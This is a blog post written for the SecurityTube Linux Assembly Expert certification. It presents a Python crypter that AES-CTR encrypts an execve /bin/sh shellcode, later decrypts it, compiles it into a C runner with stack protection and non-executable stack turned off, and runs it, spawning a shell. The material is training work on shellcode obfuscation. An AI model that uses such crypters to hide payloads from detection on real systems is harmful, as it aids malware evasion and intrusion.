# Assignment #7: Crypter

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-858


### Exercise
- Create a custom crypter like the one shown in the "crypters" video
- Free to use any existing encryption schema
- Can use any programming language


### Solution

To complete the last exercise I have used the [AES encryption algorithm](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) with the block cipher mode CTR (Counter), one of the most recommended modes of encryption. This mode turns a block cipher into a stream cipher. It generates the next keystream block by encrypting successive values of a "counter".  To read more, go to [Wikipedia](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_.28CTR.29)


So, as I am very comfortable programming on python language, I have used this language to make my crypter/decrypter.


I have used a module that implement AES in Python, the module is [pyaes](https://github.com/ricmoo/pyaes)

The installation of this module is very easy, and can be installed with pip.

```bash
$ pip install pyaes
```

I have created a command line program to generate the encrypted shellcode, and the same program using another arguments can be used to decrypt an encrypted shellcode.

```python
#!/usr/bin/env python

import struct
import sys
import pyaes		
import os

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# encrypt or decrypt
method = sys.argv[1]

# A 256 bit (32 byte) key
key = sys.argv[2]

encrypted_shellcode = ""
if method == 'decrypt':
	encrypted_shellcode = sys.argv[3]

if len(key) != 16 and len(key) != 32:
	print "[-] Error: Invalid key length"
	sys.exit(0)


counter = pyaes.Counter(initial_value = 100)
aes = pyaes.AESModeOfOperationCTR(key, counter = counter)


if (method == "encrypt"):
	encrypted_shellcode = aes.encrypt(shellcode)
	eShellcode = ""
	for x in bytearray(encrypted_shellcode) :
        	eShellcode += '\\x'
	        eShellcode += '%02x' % x
	print "[+] Encrypted shellcode: %s"%(eShellcode)
elif (method == "decrypt"):
	shellcode = aes.decrypt(encrypted_shellcode.decode("hex"))
        eShellcode = ""
        for x in bytearray(shellcode) :
                eShellcode += '\\x'
                eShellcode += '%02x' % x
	print "[*] Decrypted shellcode: %s"%eShellcode
	c_code = '''
#include<stdio.h>									 
#include<string.h>									
											
unsigned char code[] =  \"%s\"; 							
											
int main() {										
	printf(\"Shellcode Length:  %%d\", strlen(code));				
	int (*ret)() = (int(*)())code;							
	ret();										
}											
'''%eShellcode
	f = open("shellcode.c","w")
	f.write(c_code)
	f.close()
	print "[*] Compiling shellcode.c\n%s"%c_code
	os.system("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode")
	print "[+] Launching shellcode..."
	os.system("./shellcode")
		
```

The sintax to use the program:

To encrypt:

```bash
$ ./aes-ctr.py encrypt <16/32 bytes hex password>
```

To decrypt:

```bash
$ ./aes-ctr.py decrypr <16/32 bytes hex password> <encrypted shellcode>
```


Example of usage:

```bash
$ ./aes-ctr.py encrypt 0123456789abcdef0123456789abcdef
[+] Encrypted shellcode: \xd3\xa0\xf8\xd2\xfa\xbf\x28\xfc\x6b\x0c\x0b\xc2\xee\x4c\x01\xd9\x69\xb8\xcd\x96\xb2\x28\x18\x5b\xb3
$ ./aes-ctr.py decrypt 0123456789abcdef0123456789abcdef d3a0f8d2fabf28fc6b0c0bc2ee4c01d969b8cd96b228185bb3
[*] Decrypted shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
[*] Compiling shellcode.c

#include<stdio.h>									 
#include<string.h>									
											
unsigned char code[] =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; 							
											
int main() {										
	printf("Shellcode Length:  %d", strlen(code));				
	int (*ret)() = (int(*)())code;							
	ret();										
}											

[+] Launching shellcode...
$ id
uid=1000(hiro) gid=1000(hiro) groups=1000(hiro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner)
$ 
```
